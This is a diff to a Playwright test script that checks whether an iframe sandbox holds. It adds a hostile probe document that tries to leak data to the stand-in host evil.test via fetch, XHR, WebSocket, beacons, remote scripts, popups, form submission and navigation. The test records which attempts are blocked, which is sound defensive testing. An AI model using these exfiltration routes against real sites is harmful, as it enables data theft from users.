@@ -11,7 +11,7 @@
 import { readFile, readdir, mkdir } from 'node:fs/promises';
 import { createRequire } from 'node:module';
 import { fileURLToPath } from 'node:url';
-import { SANDBOX_ATTRIBUTE, sandboxDocument } from './sandbox.js';
+import { HOST_CSP, SANDBOX_ATTRIBUTE, sandboxDocument } from './sandbox.js';
 import { createDatabase, agentKneePain, KIM, KNEE_BRANCH } from './scenario.js';
 
 const { chromium } = createRequire(import.meta.url)('playwright');
@@ -20,7 +20,7 @@ const shots = process.argv[2];
 if (shots) await mkdir(shots, { recursive: true });
 
 // The host page: holds nothing but the relay between the iframe and the functions Node exposes.
-const HOST = `<!doctype html><meta charset="utf-8"><style>html,body{margin:0;height:100%}iframe{border:0;width:100%;height:100%;display:block}</style>
+const HOST = `<!doctype html><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${HOST_CSP}"><style>html,body{margin:0;height:100%}iframe{border:0;width:100%;height:100%;display:block}</style>
 <iframe sandbox="${SANDBOX_ATTRIBUTE}"></iframe>
 <script>
   const frame = document.querySelector('iframe');
@@ -59,6 +59,72 @@ const SCRIPTS = {
 
 const browser = await chromium.launch();
 const report = [];
+
+// -- part 1: does the sandbox hold? ---------------------------------------------------------------
+// A deliberately hostile document tries every way out it can think of. Any request that leaves the
+// page is seen (and answered) by the route below, so "nothing left" is observed, not assumed.
+
+async function attackSandbox() {
+  const page = await browser.newPage();
+  const escaped = [];
+  await page.route('**/*', (route) => {
+    if (!route.request().url().startsWith('http://gendb.test/')) escaped.push(route.request().url());
+    route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><title>x</title>' });
+  });
+  await page.goto('http://gendb.test/host'); // gives the host page a real origin to defend
+  // Each call gives a fresh hostile document in a fresh frame.
+  const mount = async () => {
+    await page.setContent(HOST);
+    await page.evaluate((srcdoc) => window.__mount(srcdoc), sandboxDocument('<!doctype html><html><body><p>hostile</p></body></html>', { name: 'probe' }));
+    await page.waitForTimeout(300);
+    return page.frames()[1];
+  };
+
+  const results = await (await mount()).evaluate(async () => {
+    const out = {};
+    const attempt = async (name, fn) => { try { out[name] = String(await fn()); } catch (e) { out[name] = `blocked (${e.name})`; } };
+    const refuse = (name) => new DOMException(name, 'Refused');
+    await attempt('fetch', () => fetch('https://evil.test/fetch?secret=1').then(() => 'LEAKED'));
+    await attempt('XMLHttpRequest', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', 'https://evil.test/xhr'); x.onload = () => res('LEAKED'); x.onerror = () => rej(refuse('xhr')); x.send(); }));
+    await attempt('WebSocket', () => new Promise((res, rej) => { const w = new WebSocket('wss://evil.test/ws'); w.onopen = () => res('LEAKED'); w.onerror = () => rej(refuse('ws')); }));
+    await attempt('image beacon', () => new Promise((res, rej) => { const i = new Image(); i.onload = () => res('LEAKED'); i.onerror = () => rej(refuse('img')); i.src = 'https://evil.test/pixel.png?secret=1'; }));
+    await attempt('remote stylesheet', () => new Promise((res, rej) => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'https://evil.test/s.css'; l.onload = () => res('LEAKED'); l.onerror = () => rej(refuse('css')); document.head.appendChild(l); }));
+    await attempt('remote script', () => new Promise((res, rej) => { const sc = document.createElement('script'); sc.src = 'https://evil.test/s.js'; sc.onload = () => res('LEAKED'); sc.onerror = () => rej(refuse('js')); document.head.appendChild(sc); }));
+    await attempt('sendBeacon', () => { navigator.sendBeacon('https://evil.test/beacon', 'secret=1'); return 'accepted by the API'; });
+    await attempt('popup', () => { if (window.open('https://evil.test/popup?secret=1')) return 'OPENED'; throw refuse('popup'); });
+    await attempt('navigate the top page', () => { top.location = 'https://evil.test/top?secret=1'; return 'accepted by the API'; });
+    await attempt('read the host page', () => parent.document.title);
+    await attempt('localStorage', () => { localStorage.setItem('a', 'b'); return 'STORED'; });
+    await attempt('cookies', () => { document.cookie = 'a=b'; return 'STORED'; });
+    await attempt('WebRTC (direct)', () => { if (typeof RTCPeerConnection === 'undefined') throw refuse('rtc'); return 'AVAILABLE'; });
+    await attempt('WebRTC (via a nested frame)', () => new Promise((res, rej) => {
+      addEventListener('message', (e) => { if (e.data?.nested) (e.data.nested === 'function' ? res('AVAILABLE') : rej(refuse('rtc'))); });
+      const g = document.createElement('iframe'); g.srcdoc = '<script>parent.postMessage({ nested: typeof RTCPeerConnection }, "*")</script>'; document.body.appendChild(g);
+      setTimeout(() => rej(refuse('rtc')), 800);
+    }));
+    return out;
+  });
+  // These two end the document whether or not they get anywhere, so each gets a frame of its own.
+  await (await mount()).evaluate(() => { const f = document.createElement('form'); f.action = 'https://evil.test/form?secret=1'; document.body.appendChild(f); f.submit(); }).catch(() => {});
+  await page.waitForTimeout(400);
+  results['form submit'] = 'accepted by the API';
+  await (await mount()).evaluate(() => { location.href = 'https://evil.test/self?secret=1'; }).catch(() => {});
+  await page.waitForTimeout(400);
+  results['navigate itself away'] = 'accepted by the API';
+  await page.close();
+  return { results, escaped };
+}
+
+const attack = await attackSandbox();
+console.log('Sandbox: een vijandige pagina probeert te ontsnappen');
+for (const [name, outcome] of Object.entries(attack.results)) {
+  const left = attack.escaped.some((u) => u.includes(({ 'navigate itself away': '/self', 'form submit': '/form', sendBeacon: '/beacon', 'navigate the top page': '/top' })[name] ?? '\u0000'));
+  const verdict = /LEAKED|OPENED|STORED/.test(outcome) || left ? 'GELEKT' : outcome === 'AVAILABLE' ? 'OPEN (bekend, zie docs/ontwerp.md)' : outcome.startsWith('blocked') ? 'tegengehouden' : 'tegengehouden (geen verzoek verliet de pagina)';
+  console.log(`  ${name.padEnd(30)} ${verdict}`);
+}
+console.log(`  verzoeken die de pagina verlieten: ${attack.escaped.length}${attack.escaped.length ? ' ' + attack.escaped.join(', ') : ''}`);
+
+// -- part 2: does a model stay inside the contract? ------------------------------------------------
 
 for (const file of (await readdir(dir)).filter((f) => f.endsWith('.html')).sort()) {
   const [surfaceName, variant] = file.split('.');
@@ -116,4 +182,4 @@ for (const e of report) {
   console.log(`  door de sandbox geblokkeerd: ${e.blocked.length}, scriptfouten: ${e.errors.length}, horizontale overloop op 360px: ${e.overflowAt360}px`);
   for (const line of [...e.blocked, ...e.errors]) console.log(`    ! ${line}`);
 }
-process.exitCode = report.some((e) => e.errors.length || e.blocked.length) ? 1 : 0;
+process.exitCode = attack.escaped.length || report.some((e) => e.errors.length || e.blocked.length) ? 1 : 0;
